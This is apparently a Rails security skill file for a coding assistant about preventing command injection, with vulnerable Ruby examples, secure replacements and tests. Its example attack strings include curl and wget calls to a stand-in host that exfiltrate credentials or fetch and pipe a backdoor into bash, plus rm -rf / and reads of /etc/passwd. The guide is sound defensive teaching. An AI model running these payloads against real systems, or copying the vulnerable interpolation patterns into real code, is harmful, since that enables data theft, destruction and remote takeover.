---
name: security-command-injection
domain: security
dependencies: []
version: 1.0
rails_version: 8.1+
criticality: CRITICAL
---

# Command Injection Prevention

Prevent command injection attacks by never interpolating user input into system commands. Use array arguments, input validation, and Ruby alternatives.

<when-to-use>
- Executing ANY system command with user input
- File processing (convert, resize, compress)
- PDF generation, document conversion
- Archive operations (tar, zip, unzip)
- Image manipulation with external tools
- Calling external binaries or scripts
- ALWAYS - Command injection prevention is ALWAYS required
</when-to-use>

<attack-vectors>
- **Command Chaining** - `; rm -rf /` or `&& cat /etc/passwd`
- **Pipe Attacks** - `| curl evil.com/steal?data=$(cat secrets.yml)`
- **Background Execution** - `& malicious_script.sh`
- **Command Substitution** - `$(curl evil.com/backdoor.sh | bash)`
- **File Path Traversal** - `../../../etc/passwd`
- **Data Exfiltration** - Export sensitive files or environment variables
</attack-vectors>

<standards>
- NEVER use string interpolation/concatenation in system commands
- ALWAYS use array form of system() with separate arguments
- PREFER Ruby methods over shell commands (File, FileUtils, etc.)
- VALIDATE input with strict allowlists when possible
- ESCAPE with Shellwords.escape only if array form impossible
- AVOID backticks, %x(), exec() with user input
- ISOLATE system commands in background jobs with validation
- Use ActiveStorage variants instead of ImageMagick commands
</standards>

## Vulnerable Patterns

<pattern name="string-interpolation-danger">
<description>NEVER interpolate user input into system commands</description>

**CRITICAL VULNERABILITIES:**
```ruby
# ❌ CRITICAL - Command injection via concatenation
system("echo #{params[:filename]}")
# Attack: "hello; rm -rf /" → Echoes "hello" AND DELETES ALL FILES

# ❌ CRITICAL - Data exfiltration
system("convert #{params[:image]} output.jpg")
# Attack: "image.jpg; cat /etc/passwd > public/passwords.txt"

# ❌ CRITICAL - Secret theft
system("/bin/tar -czf backup.tar.gz #{params[:directory]}")
# Attack: "/app/data; curl evil.com?data=$(cat config/credentials.yml.enc)"

# ❌ CRITICAL - Backdoor installation
system("unzip #{params[:archive]}")
# Attack: "file.zip; curl evil.com/backdoor.sh | bash"

# ❌ CRITICAL - Using backticks
output = `ls #{params[:path]}`
# Attack: "/; cat /etc/passwd" → Directory listing AND password exposure

# ❌ CRITICAL - Using %x()
result = %x(convert #{params[:input]} output.png)
# Attack: "file.jpg; wget evil.com/malware"
```

**Why This Happens:**
User input is interpreted as shell commands, allowing arbitrary command execution with application privileges.
</pattern>

## Secure Patterns

<pattern name="array-arguments-recommended">
<description>Use array form of system() - RECOMMENDED approach</description>

**Safe Array Form:**
```ruby
# ✅ SECURE - Array arguments prevent shell interpretation
system("/bin/echo", params[:filename])
# Input: "hello; rm -rf /" → printed literally, NOT executed

# ✅ SECURE - Image conversion
system("convert", params[:image], "output.jpg")

# ✅ SECURE - Archive creation
system("/bin/tar", "-czf", "backup.tar.gz", validated_directory)

# ✅ SECURE - Multiple arguments
system("wkhtmltopdf", "--quiet", "--page-size", "A4", input_file, output_file)
```

**How It Works:**
Array arguments bypass shell invocation, treating user input as literal arguments only.

**Controller Example:**
```ruby
class ExportsController < ApplicationController
  def pdf
    feedback = Feedback.find(params[:id])
    output_path = Rails.root.join("tmp", "feedback_#{feedback.id}.pdf")

    success = system("wkhtmltopdf", "--quiet", feedback_url(feedback), output_path.to_s)

    if success
      send_file output_path, type: "application/pdf"
    else
      render plain: "PDF generation failed", status: :internal_server_error
    end
  end
end
```
</pattern>

<pattern name="input-validation-allowlist">
<description>Validate input with strict allowlists</description>

**Allowlist Validation:**
```ruby
# ✅ SECURE - Only allow predefined values
VALID_FORMATS = %w[pdf png jpg svg].freeze
VALID_SIZES = %w[small medium large].freeze

def export_feedback(feedback, format, size)
  unless VALID_FORMATS.include?(format)
    raise ArgumentError, "Invalid format: #{format}"
  end

  unless VALID_SIZES.include?(size)
    raise ArgumentError, "Invalid size: #{size}"
  end

  # Safe because format is from allowlist
  system("convert", "feedback.html", "output.#{format}")
end
```

**Integer Validation:**
```ruby
# ✅ SECURE - Validate input is integer
def export_feedback_pdf(feedback_id)
  id = Integer(feedback_id) # Raises ArgumentError if invalid
  system("wkhtmltopdf", "http://localhost/feedbacks/#{id}", "tmp/feedback_#{id}.pdf")
rescue ArgumentError
  raise "Invalid feedback ID"
end
```

**Regex Validation:**
```ruby
# ✅ SECURE - Strict path validation
def process_upload(filename)
  raise ArgumentError, "Invalid filename format" unless filename.match?(/\A[\w\-]+\.(jpg|png|gif)\z/)
  system("convert", filename, "processed_#{filename}")
end
```

**Path Validation:**
```ruby
# ✅ SECURE - Prevent directory traversal
def safe_file_path(user_input)
  base_dir = Rails.root.join("uploads")
  full_path = base_dir.join(user_input).expand_path

  raise ArgumentError, "Invalid path: directory traversal" unless full_path.to_s.start_with?(base_dir.to_s)
  full_path
end
```
</pattern>

<pattern name="ruby-alternatives-preferred">
<description>Use Ruby methods instead of shell commands (PREFERRED)</description>

**File Operations:**
```ruby
# ❌ VULNERABLE - Shell command
system("rm #{params[:filename]}")

# ✅ SECURE - Ruby method
File.delete(params[:filename]) if File.exist?(params[:filename])

# ❌ VULNERABLE - Shell command
system("mkdir -p #{params[:directory]}")

# ✅ SECURE - Ruby method
FileUtils.mkdir_p(params[:directory])

# ❌ VULNERABLE - Shell command
system("cp #{params[:source]} #{params[:dest]}")

# ✅ SECURE - Ruby method
FileUtils.cp(params[:source], params[:dest])

# ❌ VULNERABLE - Shell command
system("mv #{params[:old]} #{params[:new]}")

# ✅ SECURE - Ruby method
FileUtils.mv(params[:old], params[:new])
```

**Archive Operations:**
```ruby
# ❌ VULNERABLE - Shell tar command
system("tar -czf archive.tar.gz #{params[:directory]}")

# ✅ SECURE - Use minitar gem
require "minitar"
Minitar.pack(directory, File.open(output_file, "wb"))
```

**Why Prefer Ruby:**
No shell interpretation = no injection risk, better error handling, cross-platform compatibility.
</pattern>

<pattern name="shellwords-escaping">
<description>Use Shellwords.escape when array form not possible</description>

**Shellwords Escaping:**
```ruby
require "shellwords"

# ✅ SECURE - Escape user input for shell safety
filename = Shellwords.escape(params[:filename])
system("convert input.jpg #{filename}")

# ✅ SECURE - Multiple arguments
args = [params[:input], params[:output]].map { |arg| Shellwords.escape(arg) }.join(" ")
system("convert #{args} -resize 800x600")
```

**How Shellwords Works:**
```ruby
Shellwords.escape("file.jpg") # => "file.jpg"
Shellwords.escape("file with spaces.jpg") # => "file\\ with\\ spaces.jpg"
Shellwords.escape("file; rm -rf /") # => "file\\;\\ rm\\ -rf\\ /"
Shellwords.escape("$(cat /etc/passwd)") # => "\\$\\(cat\\ /etc/passwd\\)"
```

**When to Use:**
Only when array form is truly not possible. Prefer array form whenever available.
</pattern>

<pattern name="activestorage-variants">
<description>Use ActiveStorage variants instead of system commands</description>

**ActiveStorage Model:**
```ruby
class Feedback < ApplicationRecord
  has_one_attached :image

  def thumbnail
    image.variant(resize_to_limit: [100, 100])
  end

  def processed_image
    image.variant(resize_to_fill: [800, 600], format: :jpg, saver: { quality: 80 })
  end
end
```

**View:**
```erb
<%= image_tag feedback.thumbnail %>
<%= image_tag feedback.processed_image %>
```

**Controller:**
```ruby
class FeedbacksController < ApplicationController
  def create
    @feedback = Feedback.new(feedback_params)
    if @feedback.save
      redirect_to @feedback, notice: "Feedback created with image"
    else
      render :new, status: :unprocessable_entity
    end
  end

  private

  def feedback_params
    params.require(:feedback).permit(:title, :content, :image)
  end
end
```

**Benefits:**
No shell commands = no injection vectors. Built-in format conversion, cloud storage support, secure by design.
</pattern>

<pattern name="background-job-isolation">
<description>Isolate system commands in background jobs with strict validation</description>

**Background Job:**
```ruby
class PdfGenerationJob < ApplicationJob
  def perform(feedback_id, output_path)
    feedback = Feedback.find(feedback_id)
    validate_output_path!(output_path)

    success = system(
      "wkhtmltopdf", "--quiet", "--page-size", "A4",
      "--disable-javascript", feedback.public_url, output_path
    )

    raise "PDF generation failed" unless success
    PdfMailer.with(feedback: feedback, pdf_path: output_path).ready.deliver_later
  end

  private

  def validate_output_path!(path)
    raise ArgumentError, "Invalid output path" unless path.match?(/\Atmp\/feedback_\d+\.pdf\z/)

    full_path = Rails.root.join(path).expand_path
    allowed_dir = Rails.root.join("tmp").expand_path
    raise ArgumentError, "Path outside allowed directory" unless full_path.to_s.start_with?(allowed_dir.to_s)
  end
end
```

**Controller:**
```ruby
class ExportsController < ApplicationController
  def generate_pdf
    feedback = Feedback.find(params[:id])
    PdfGenerationJob.perform_later(feedback.id, "tmp/feedback_#{feedback.id}.pdf")
    redirect_to feedback, notice: "PDF generation started"
  end
end
```
</pattern>

<antipatterns>
<antipattern>
<description>Using backticks for command execution</description>
<reason>CRITICAL - Allows command injection through shell interpretation</reason>
<bad-example>
```ruby
# ❌ CRITICAL VULNERABILITY
output = `ls #{params[:path]}`
# Attack: "/; cat /etc/passwd" → Directory listing AND password exposure
```
</bad-example>
<good-example>
```ruby
# ✅ SECURE - Use array form and capture output
require "open3"
validate_path!(params[:path])
output, status = Open3.capture2("ls", params[:path])
```
</good-example>
</antipattern>

<antipattern>
<description>Building commands with string interpolation</description>
<reason>CRITICAL - Shell interprets special characters in user input</reason>
<bad-example>
```ruby
# ❌ CRITICAL VULNERABILITY
system("convert #{params[:input]} -resize #{params[:size]} output.jpg")
# Attack: "800x600; curl evil.com/backdoor.sh | bash"
```
</bad-example>
<good-example>
```ruby
# ✅ SECURE - Use array form with validation
raise ArgumentError, "Invalid size" unless params[:size].match?(/\A\d{1,4}x\d{1,4}\z/)
system("convert", params[:input], "-resize", params[:size], "output.jpg")
```
</good-example>
</antipattern>

<antipattern>
<description>Not validating file paths for directory traversal</description>
<reason>HIGH - Allows access to files outside intended directory</reason>
<bad-example>
```ruby
# ❌ VULNERABLE - Directory traversal
file_path = Rails.root.join("uploads", params[:file])
send_file file_path
# Attack: "../../../etc/passwd"
```
</bad-example>
<good-example>
```ruby
# ✅ SECURE - Validate path stays within directory
base_dir = Rails.root.join("uploads")
file_path = base_dir.join(params[:file]).expand_path
raise ArgumentError, "Invalid file path" unless file_path.to_s.start_with?(base_dir.to_s)
send_file file_path if File.exist?(file_path)
```
</good-example>
</antipattern>
</antipatterns>

<testing>
```ruby
# test/jobs/pdf_generation_job_test.rb
class PdfGenerationJobTest < ActiveJob::TestCase
  test "validates output path format" do
    assert_raises(ArgumentError, /Invalid output path/) do
      PdfGenerationJob.perform_now(feedbacks(:one).id, "invalid_path.pdf")
    end
  end

  test "prevents directory traversal in path" do
    assert_raises(ArgumentError, /Invalid output path|outside allowed/i) do
      PdfGenerationJob.perform_now(feedbacks(:one).id, "../../../etc/passwd")
    end
  end

  test "rejects command injection in path" do
    assert_raises(ArgumentError) do
      PdfGenerationJob.perform_now(feedbacks(:one).id, "output.pdf; rm -rf /")
    end
  end
end

# test/controllers/exports_controller_test.rb
class ExportsControllerTest < ActionDispatch::IntegrationTest
  test "validates file path parameter" do
    assert_raises(ArgumentError) { get download_path(file: "../../../etc/passwd") }
  end
end

# test/models/feedback_test.rb
class FeedbackTest < ActiveSupport::TestCase
  test "image variants are processed safely" do
    feedback = feedbacks(:one)
    feedback.image.attach(io: File.open(Rails.root.join("test/fixtures/files/test.jpg")),
                          filename: "test.jpg", content_type: "image/jpeg")
    assert feedback.thumbnail.present?
  end
end
```
</testing>

<related-skills>
- security-xss - Output escaping
- security-sql-injection - SQL injection prevention
- security-file-uploads - Safe file handling
- solid-stack-setup - Isolating risky operations
</related-skills>

<resources>
- [Rails Security Guide - Command Line Injection](https://guides.rubyonrails.org/security.html#command-line-injection)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Ruby Shellwords Documentation](https://ruby-doc.org/stdlib/libdoc/shellwords/rdoc/Shellwords.html)
</resources>
